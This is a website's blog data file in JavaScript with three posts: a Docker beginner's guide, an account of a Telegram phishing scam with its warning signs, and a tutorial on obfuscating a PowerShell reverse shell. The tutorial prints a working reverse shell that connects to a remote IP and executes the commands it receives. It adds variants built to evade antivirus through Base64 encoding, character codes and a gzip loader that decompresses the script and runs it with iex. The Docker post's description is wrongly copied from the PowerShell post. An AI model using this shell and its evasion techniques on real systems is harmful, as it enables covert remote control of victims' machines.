// import blogImg1 from './blogs/obs-payload.svg'
// import blogImg2 from './blogs/docker-blog.svg'
// import blogImg3 from './blogs/telegram-phishing.svg'
export const categories = [
  "All Categories",
  "Cyber Security",
  "Developement",
  "Digital Marketing",
  "Artificial intelligence",
  "BlockChain",
  "App Development",
];

export const tags = [
  {
    id: 1,
    href: "#",
    name: "Courses",
  },
  {
    id: 2,
    href: "#",
    name: "Learn",
  },
  {
    id: 3,
    href: "#",
    name: "Online",
  },
  {
    id: 4,
    href: "#",
    name: "Education",
  },
  {
    id: 5,
    href: "#",
    name: "LMS",
  },
  {
    id: 6,
    href: "#",
    name: "Training",
  },
];

export const blogs = [
  {
    id: "obfuscating-powershell-scripts",
    imageSrc: 'https://utfs.io/f/CVETMkBmijEYJ6t6ijb8t3i51LRDQynvW4lb62wdfYqekFhx',
    metatitle:
      "How to Obfuscate a PowerShell Script to Evade Antivirus and Gain a Reverse Shell",
    author: "Nithish Kumar",
    authorLink: "https://www.linkedin.com/in/nithish-kumar-b64aa2224/",
    metadesc:
      "Learn how to obfuscate PowerShell scripts to bypass antivirus detection and achieve a reverse shell in penetration testing. This guide covers key obfuscation techniques such as variable renaming, Base64 encoding, string manipulation, and more. Perfect for ethical hackers and security professionals.",
    category: "Cyber Security",
    title:
      "How to Obfuscate a PowerShell Script to Evade Antivirus and Obtain a Reverse Shell ",
    date: "October 14, 2024",
    desc: "Learn how to obfuscate PowerShell scripts to bypass antivirus detection and achieve a reverse shell in penetration testing. This guide covers key obfuscation techniques such as variable renaming, Base64 encoding, string manipulation, and more. Perfect for ethical hackers and security professionals.",
    para: [
      {
        heading: "Introduction",
        text: "The below PowerShell script is a reverse shell script. Reverse shells are commonly used in penetration testing and by attackers to gain access to a system by initiating a connection back to a remote server. In the script, a connection is made to a specific IP and port, commands are executed locally, and the results are sent back over the network to the attacker or server.\n    Obfuscation is the process of deliberately making code difficult to read and understand while maintaining its functionality. Obfuscating a reverse shell script or any potentially malicious script is a tactic to avoid detection by security tools and to hinder human analysis.",
      },
      {
        heading: "Reverse Shell Script",
        code: "$hi = New-Object System.Net.Sockets.TCPClient('192.168.1.31',1234);\n$ste = $hi.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $ste.Read($bytes, 0, $bytes.Length)) -ne 0){\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n    $sendback = (iex '. { $data } 2>&1' | Out-String );\n    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n$ste.Write($sendbyte,0,$sendbyte.Length);/n    $ste.Flush();\n};\n$hi.Close();",
      },
      {
        heading: "Ways to Obfuscate the Script:",
        subheading: "1. Variable Renaming:",
        text: "Rename variables to random, meaningless names to make the script harder to understand.",
        code: "$a = New-Object System.Net.Sockets.TCPClient('192.168.1.31',1234); \n$b = $a.GetStream();\n[byte[]]$c = 0..65535|%{0};\nwhile(($d = $b.Read($c, 0, $c.Length)) -ne 0)\n{$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d);\n$f = (iex '. { $e } 2>&1' | Out-String );\n$g = $f + 'PS ' + (pwd).Path + '> ';\n$h = ([text.encoding]::ASCII).GetBytes($g);\n$b.Write($h,0,$h.Length);\n$b.Flush();}\n$a.Close();",
      },
      {
        subheading: "2. Base64 Encoding:",
        text: "PowerShell can execute Base64-encoded commands using the -EncodedCommand flag. \nFirst, convert the script to Base64:\n \t 1. Save the script to a .ps1 file.\n   2. Run the following command in PowerShell to encode it:",
        code: "$command = Get-Content .your-script.ps1 | Out-String\n$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)\n$encodedCommand = [Convert]::ToBase64String($bytes)\nWrite-Output $encodedCommand",
      },
      {
        text: "Then, the encoded script can be run using:",
        code: "powershell -encodedCommand <Base64String>",
      },
      {
        subheading: "3. String Manipulation:",
        text: "Break up important strings, like IP addresses, function names, and ports, into parts and concatenate them at runtime.",
        code: "$ip = ('192'+'168'+'1'+'31');\n$port = (1200 + 34);\n$a = New-Object System.Net.Sockets.TCPClient($ip, $port);",
      },
      {
        heading: "4. Using Alternate Character Encodings:",
        text: "You can use character codes or alternate encoding methods to represent strings.",
      },
      {
        subheading: "Example using character codes:",
        code: "$ip = ([char]49+[char]57+[char]50+'.'+[char]49+[char]54+[char]56+'.'+[char]49+'.'+[char]51+[char]49);\n$port = 1234;\n$a = New-Object System.Net.Sockets.TCPClient($ip, $port);",
      },
      {
        heading: "5. Use Compression:",
        text: "You can compress the script and execute it dynamically after decompression.",
      },
      {
        subheading: "• Compress the script using Gzip:",
        code: "$original = 'Your script here...'\n$bytes = [System.Text.Encoding]::UTF8.GetBytes($original)\n$ms = New-Object IO.MemoryStream\n$gzip = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Compress)\n$gzip.Write($bytes, 0, $bytes.Length)\n$gzip.Close()\n[Convert]::ToBase64String($ms.ToArray())",
      },
      {
        subheading: "• At runtime, decompress and execute it:",
        code: "$compressed = 'Base64 string of compressed script';\n$bytes = [Convert]::FromBase64String($compressed);\n$ms = New-Object IO.MemoryStream($bytes);\n$gzip = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress);\n$reader = New-Object IO.StreamReader($gzip);\n$script = $reader.ReadToEnd();\niex $script;",
      },
      {
        heading: "6. Custom Encoding:",
        text: "Create a custom encoding/decoding function that transforms the script. For example:",
        code: "$encodedCommand = 'AbcDefGhI';\n$decodedCommand = $encodedCommand -replace 'A','p' -replace 'b','o' -replace 'c','w';\niex $decodedCommand;",
      },
      {
        heading: "7. Random Whitespace Insertion:",
        text: "You can add random spaces, tabs, and newlines, which PowerShell will ignore but make the script look messy and harder to read.",
        code: "$a    = New-Object System.Net.Sockets.    TCPClient( '192.168.1.31', 1234);\n$b=$a   .   GetStream();\n[byte[]]$c =    0..65535   | % { 0 };",
      },
      {
        text: "By using a combination of these techniques, you can significantly obfuscate your PowerShell script. However, keep in mind that determined security professionals can reverse most obfuscation techniques. Obfuscation is not encryption; it only hides the intent of the script, not its functionality.",
      },
    ],
  },
  {
    id: "intoduction-to-docker",
    imageSrc: 'https://utfs.io/f/CVETMkBmijEYwO5u9GfVMU39ILuTcyhHdNRPfpKiB0QJZYqk',
    metatitle: "Getting Started with Docker: A Beginner's Guide",
    author: "Brijith K Biju",
    authorLink: "https://www.linkedin.com/in/brijith-k-biju/",
    metadesc:
      "Learn how to obfuscate PowerShell scripts to bypass antivirus detection and achieve a reverse shell in penetration testing. This guide covers key obfuscation techniques such as variable renaming, Base64 encoding, string manipulation, and more. Perfect for ethical hackers and security professionals.",
    category: "Developement",
    title: "Getting Started with Docker: A Beginner's Guide",
    date: "October 29, 2024",
    desc: "Learn how to obfuscate PowerShell scripts to bypass antivirus detection and achieve a reverse shell in penetration testing. This guide covers key obfuscation techniques such as variable renaming, Base64 encoding, string manipulation, and more. Perfect for ethical hackers and security professionals.",
    para: [
      {
        heading: "Introduction to Docker and Containerization",
        text: "Docker is a tool that makes it easier to develop, test, and deploy applications by packaging them in containers. Containers are lightweight environments that hold everything an application needs to run like code, system tools, and libraries. So it can run consistently across different setups. With Docker, developers can create, share, and run applications without worrying about the differences between systems.",
      },
      {
        heading: "Basic Terms in Docker",
        text: "Getting familiar with a few core Docker terms is essential for beginners:",
      },
      {
        subheading: "1. Image",
        text: " An image is a snapshot of an application and its environment. Think of it as a template or recipe for creating containers.",
      },

      {
        subheading: "2. Container",
        text: "A container is an instance of an image that can be run and interacted with. It’s like a lightweight virtual machine.",
      },
      {
        subheading: "3. Dockerfile",
        text: "A text file with instructions on how to build an image, such as which base image to use, files to include, and commands to run.",
      },
      {
        subheading: "4. Docker Compose",
        text: " A tool for defining and managing multi-container Docker applications. With a single configuration file, you can set up multiple containers, like a web server and a database.",
      },
      {
        heading: "Creating a Simple Docker Image",
        text: "To create a Docker image, you’ll use a Dockerfile. This file lists out all the steps to set up the application. For example, if you’re making a simple web app in Node.js, the Dockerfile might specify a base Node image, copy the app files, install dependencies, and define a command to start the app.",
        code: '# Sample Dockerfile for a Node.js App\nFROM node:14      # Use the Node.js image as a base\nWORKDIR /app      # Set working directory\nCOPY . /app       # Copy all files into /app\nRUN npm install   # Install app dependencies\nCMD ["node", "app.js"]   # Run the app',
      },
      {
        heading: "Building the Image",
        text: "Once you have a Dockerfile, you can build an image using the `docker build` command. This creates an image with all the instructions from the Dockerfile. Each time you change your Dockerfile, you need to rebuild the image to reflect those updates.",
        code: "docker build -t my-node-app .",
      },
      {
        heading: "Running a Docker Container",
        text: "After building the image, use the `docker run` command to start a container. This will create a running instance of your image. With flags like `-p`, you can map ports, allowing you to access the app from your computer.",
        code: "docker run -p 3000:3000 my-node-app",
      },
      {
        heading: "Introduction to Docker Compose",
        text: "Docker Compose helps manage applications with multiple containers, like a website with a database. It uses a YAML file (usually called `docker-compose.yml`) to define all the services, networks, and volumes your application needs. Running `docker-compose up` starts all the containers in the setup at once.",
      },
      {
        heading: "Docker Compose Example",
        text: "Below is an example of a `docker-compose.yml` file for a simple web app and database setup. This file defines two services: `web` and `db`. Each service has its own image and configurations, so you can launch them together with `docker-compose up`.",
        code: "# docker-compose.yml\nversion: '3'\nservices:\n  web:\n    build: .\n    ports:\n      - \"3000:3000\"\n  db:\n    image: postgres\n    environment:\n      POSTGRES_PASSWORD: example",
      },
      {
        heading: "Summary",
        text: "By understanding these basic Docker terms and steps, you're ready to start containerizing simple applications. Try using Docker Compose for multi-container setups and experiment with different images to become comfortable with Docker’s core concepts. Practice building and running containers to see how Docker simplifies app development and deployment!",
      },
    ],
  },
  {
    id: "old-photos-telegram-phishing-link",
    imageSrc: 'https://utfs.io/f/CVETMkBmijEYBfkUnlO29C0HQkKuITjVgfSD8lWdXvhREFAm',
    metatitle:
      `"Photos of You as a Child": The Phishing Scam Targeting Telegram Users`,
    author: "Nithish Kumar",
    authorLink: "https://in.linkedin.com/in/nithish-kumar-b64aa2224",
    metadesc:
      "Recent phishing attempts on Telegram are spreading fast. Hackers use emotional manipulation to trick us by sending messages from compromised friends' accounts, claiming to have 'photos of us from childhood.'",
    category: "Cyber Security",
    title:
      "‘Photos of You as a Child’: The Phishing Scam Targeting Telegram Users",
    date: "November 02, 2024",
    desc: "Recent phishing attempts on Telegram are spreading fast. Hackers use emotional manipulation to trick us by sending messages from compromised friends' accounts, claiming to have 'photos of us from childhood.'",
    para: [
      {
        heading: "Introduction",
        text: "Imagine getting a message from a close friend with a link that says something like, “Photos of you as a child.” I thought, Did my friend find some old photos and upload them to share? But what happened next turned out to be a close call with a cleverly crafted phishing attack that could have compromised my Telegram account and much more. Here’s what happened and how you can protect yourself from similar scams.",
        img: "/assets/blog/telegram-phishing.jpg",
      },
      {
        heading: "It All Started with a Friendly Message",
        text: "Just like any other day, I received a message on Telegram from a trusted friend. The message seemed innocent enough: “Photos of you as a child.” Who wouldn’t be curious, right? With the link attached, I figured they had uploaded some old pictures to a cloud service. It seemed legit at first glance, and my guard was down because it came from someone I trusted.",
      },
      {
        heading: "A Fake Telegram Login Page",
        text: "As I clicked the link, I was directed to what looked like the Telegram login page. It appeared authentic, down to the smallest details. They’d perfectly replicated the interface, including the option to enter my phone number to receive a one-time password (OTP) and even Multi-Factor Authentication (MFA) verification. I began to suspect something was wrong, but the page was so well-crafted that it could fool almost anyone.",
      },
      {
        heading: "The Red flags",
        text: "Fortunately, some aspects of the phishing attempt started to stand out:",
      },
      {
        subheading: "1. The URL was Suspicious: ",
        text: " The domain name didn’t match Telegram’s official URL, which immediately raised a red flag. Phishing sites often use lookalike URLs or add extra words like “secure,” “telegram-login,” or “cloud” to seem legitimate.",
      },
      {
        subheading: "2. An Unexpected OTP Request:",
        text: "Receiving an OTP from Telegram for a link sent by a friend didn’t make sense. Typically, an OTP is only necessary when I initiate a login, not for accessing shared photos.",
      },
      {
        subheading: "3. A Friend’s Unusual Behavior:",
        text: "The casual nature of the message didn’t quite fit the way my friend usually communicates. This often-overlooked detail can be a major indicator that something is amiss.",
      },
      {
        heading: "The Consequences of Falling for Such Phishing Scams",
        text: "If I had entered my details on this fake login page, the scammers could have:",
      },
      {
        subheading: " • Stolen My Telegram Account:",
        text: " They’d instantly have access to my account, chats, contacts, and any information within those conversations.",
      },
      {
        subheading: " • Spread the Attack:",
        text: "With access to my account, they could message my contacts, posing as me, to send them similar phishing links.",
      },
      {
        subheading: " • Potentially Access Other Accounts: ",
        text: "If my Telegram was linked to other social media or email accounts, they could initiate password reset requests and access more of my data.",
      },
      {
        heading: "Conclusion",
        text: "Phishing scams are getting more sophisticated by the day, and even the savviest among us can fall victim if we’re not careful. This experience was a reminder of how essential it is to stay vigilant, even with messages from people we trust. By recognizing the red flags and following basic security practices, we can keep ourselves safe in an increasingly digital world.",
      },
    ],
  },
];
